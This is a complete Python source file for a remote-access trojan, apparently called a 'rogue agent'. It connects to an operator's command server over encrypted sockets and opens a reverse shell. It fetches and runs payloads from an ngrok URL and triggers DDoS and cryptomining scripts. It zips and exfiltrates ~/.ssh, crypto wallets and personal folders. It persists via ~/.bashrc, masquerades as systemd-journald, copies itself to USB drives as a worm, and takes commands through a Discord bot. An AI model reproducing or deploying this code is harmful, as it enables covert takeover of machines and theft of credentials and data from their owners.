#!/usr/bin/env python3
import socket, subprocess, base64, time, urllib.request, os, threading
from Cryptodome.Cipher import AES
import zipfile, tempfile, shutil, json

# === Config ===
SECRET_KEY = b'Sixteen byte key'
EXFIL_KEY = b'magicRogueKey!'
C2_HOST = 'YOUR.C2.IP.HERE'
C2_PORT = 4444
EXFIL_PORT = 9090
PAYLOAD_REPO = "https://abc123.ngrok.io/"
HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
os.makedirs(HIDDEN_DIR, exist_ok=True)

# === Discord Fallback (Optional) ===
DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages?limit=1"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID"
BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"

def encrypt_response(msg):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def decrypt_command(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def fetch_payload(name):
    url = f"{PAYLOAD_REPO}{name}"
    dest = os.path.join(HIDDEN_DIR, name)
    try:
        urllib.request.urlretrieve(url, dest)
        return dest
    except:
        return None

def run_payload(name):
    path = os.path.join(HIDDEN_DIR, name)
    if os.path.exists(path):
        return subprocess.getoutput(f"python3 {path}")
    return f"[!] Payload {name} not found."

def zip_directory(path, zipf=None, base=""):
    if zipf is None:
        zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
        zipf = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
        should_close = True
    else:
        should_close = False

    if os.path.isdir(path):
        for root, _, files in os.walk(path):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.join(base, os.path.relpath(full_path, path))
                zipf.write(full_path, arcname)
    elif os.path.isfile(path):
        zipf.write(path, arcname=os.path.join(base, os.path.basename(path)))

    if should_close:
        zipf.close()
        return zip_path

def encrypt_file(path):
    with open(path, 'rb') as f:
        plaintext = f.read()
    cipher = AES.new(EXFIL_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce + tag + ciphertext

def exfiltrate_data(path):
    try:
        zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            if isinstance(path, list):
                for p in path:
                    zip_directory(p, zipf, base=os.path.basename(p))
            else:
                zip_directory(path, zipf)
        encrypted_blob = encrypt_file(zip_path)
        os.remove(zip_path)

        s = socket.socket()
        s.connect((C2_HOST, EXFIL_PORT))
        s.sendall(encrypted_blob)
        s.close()
        return f"[+] Exfiltrated encrypted archive from: {path}"
    except Exception as e:
        return f"[!] Exfiltration failed: {e}"

def reverse_shell():
    try:
        s = socket.socket()
        s.connect((C2_HOST, 9001))
        while True:
            s.send(b"$ ")
            cmd = s.recv(1024).decode()
            if cmd.strip().lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            s.send(output.encode())
        s.close()
    except:
        pass

def handle_trigger(cmd):
    if cmd.startswith("trigger_ddos"):
        fetch_payload("ddos.py")
        path = os.path.join(HIDDEN_DIR, "ddos.py")
        args = " ".join(cmd.split()[1:])
        return subprocess.getoutput(f"python3 {path} {args}")

    elif cmd == "trigger_mine":
        return run_payload("mine.py")

    elif cmd == "trigger_stopmine":
        return subprocess.getoutput("pgrep -f mine.py && pkill -f mine.py || echo '[-] No miner running.'")

    elif cmd.startswith("trigger_exfil"):
        return exfiltrate_data(cmd.split(" ", 1)[1])

    elif cmd == "trigger_dumpcreds":
        targets = [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/.ssh"),
            os.path.expanduser("~/.wallets"),
        ]
        return exfiltrate_data(targets)

    elif cmd == "trigger_stealthinject":
        path = os.path.join(HIDDEN_DIR, "polyloader.py")
        if not os.path.exists(path):
            fetch_payload("polyloader.py")
        return subprocess.getoutput(f"python3 {path}")

    return None

def handle_command(cmd):
    if cmd.startswith("load_payload"):
        return f"[+] Fetched {cmd.split()[1]}" if fetch_payload(cmd.split()[1]) else f"[!] Failed to fetch {cmd.split()[1]}"
    elif cmd.startswith("run_payload"):
        return run_payload(cmd.split()[1])
    elif cmd.startswith("trigger_"):
        return handle_trigger(cmd) or "[!] Trigger failed"
    elif cmd == "reverse_shell":
        threading.Thread(target=reverse_shell).start()
        return "[*] Reverse shell started"
    return subprocess.getoutput(cmd)

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((C2_HOST, C2_PORT))
            while True:
                encrypted_data = s.recv(4096)
                cmd = decrypt_command(encrypted_data)
                result = handle_command(cmd)
                s.send(encrypt_response(result))
        except:
            time.sleep(5)

def check_discord_command():
    try:
        headers = {"Authorization": f"Bot {BOT_TOKEN}"}
        req = urllib.request.Request(DISCORD_COMMAND_URL, headers=headers)
        response = urllib.request.urlopen(req).read().decode()
        latest = json.loads(response)[0]["content"]
        return latest
    except:
        return None

def send_to_webhook(content):
    try:
        req = urllib.request.Request(
            DISCORD_WEBHOOK,
            data=json.dumps({"content": content}).encode(),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req)
    except:
        pass

def discord_loop():
    print("[+] Discord beacon active")
    last_cmd = ""
    while True:
        cmd = check_discord_command()
        if cmd and cmd != last_cmd:
            result = handle_command(cmd)
            send_to_webhook(encrypt_response(result).decode())
            last_cmd = cmd
        time.sleep(30)

def fake_name():
    try:
        import setproctitle
        setproctitle.setproctitle("systemd-journald")
    except:
        pass

def setup_persistence():
    target = os.path.join(HIDDEN_DIR, ".rogue_agent.py")
    if not os.path.exists(target):
        shutil.copy(__file__, target)
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write(f"\n(sleep 10 && python3 {target} &) &\n")
        os.chmod(target, 0o700)

def worm_propagate():
    drives = subprocess.getoutput("lsblk -o MOUNTPOINT -nr | grep -v '^$'").splitlines()
    for mount in drives:
        if "/media" in mount or "/run/media" in mount:
            try:
                worm_dir = os.path.join(mount.strip(), ".rogue_worm")
                os.makedirs(worm_dir, exist_ok=True)
                shutil.copy(__file__, os.path.join(worm_dir, "rogue_implant.py"))
                with open(os.path.join(worm_dir, ".bash_login"), "w") as f:
                    f.write(f"python3 .rogue_worm/rogue_implant.py &\n")
            except Exception as e:
                pass

def p2p_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 7007))
    while True:
        data, addr = sock.recvfrom(1024)
        if data.decode() == "Rogue?":
            sock.sendto(b"I'm Rogue", addr)

def p2p_broadcast():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(b"Rogue?", ('<broadcast>', 7007))

# === Launch ===
threading.Thread(target=p2p_listener, daemon=True).start()
threading.Thread(target=p2p_broadcast, daemon=True).start()
threading.Thread(target=discord_loop, daemon=True).start()

fake_name()
setup_persistence()
worm_propagate()
connect()
